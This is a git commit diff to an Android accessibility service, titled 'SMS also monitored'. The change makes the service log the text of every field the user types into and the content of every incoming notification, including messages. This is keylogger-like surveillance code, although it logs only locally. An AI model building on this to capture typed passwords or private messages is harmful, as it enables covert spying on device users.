25f731fec24815c0f90a974df7612a2782cc2784
huobb0 <zsombor.kovacs@gmail.com>
2019-06-26 15:23:57 +0200

    SMS also monitored

--- app/src/main/java/mx/xx/myapplication/MyAccessibilityService.java
+++ app/src/main/java/mx/xx/myapplication/MyAccessibilityService.java
@@ -5,11 +5,11 @@ import android.content.Intent;
 import android.os.IBinder;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-import static android.content.ContentValues.TAG;
 import android.accessibilityservice.AccessibilityService;
 import android.view.accessibility.AccessibilityNodeInfo;
 
 public class MyAccessibilityService extends AccessibilityService {
+    final static String TAG = "AccTag";
 
     private String getEventText(AccessibilityEvent event) {
         StringBuilder sb = new StringBuilder();
@@ -21,31 +21,24 @@ public class MyAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        Log.d(TAG,"onAccessibiltyEvent reached");
+        /*Log.d(TAG,"onAccessibilityEvent reached");
         Log.v(TAG, String.format(
-                "onAccessibilityEvent: type = [ %s ], class = [ %s ], package = [ %s ], time = [ %s ], text = [ %s ]",
+                "****************************** onAccessibilityEvent: type = [ %s ], class = [ %s ], package = [ %s ], time = [ %s ], text = [ %s ]",
                 event.getEventType(), event.getClassName(), event.getPackageName(),
-                event.getEventTime(),event.getClassName().toString()));
+                event.getEventTime(),event.toString()));*/
 
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             AccessibilityNodeInfo mNodeInfo = event.getSource();
             try{
-                Log.d(TAG,mNodeInfo.toString());
+                /*Log.d(TAG,mNodeInfo.toString());*/
+                Log.d(TAG,"ENTERED TEXT:" + mNodeInfo.getText().toString());
             } catch (Exception e){
                 Log.d(TAG,Log.getStackTraceString(e));
             }
         }
 
-        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-                StringBuilder message = new StringBuilder();
-                if (!event.getText().isEmpty()) {
-                    for (CharSequence subText : event.getText()) {
-                        message.append(subText);
-                    }
-                    if (message.toString().contains("Message from")) {
-                        Log.d(TAG, message.toString());
-                    }
-                }
+        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED){
+                Log.d(TAG,"Message received - " + event.getText());
         }
     }
 
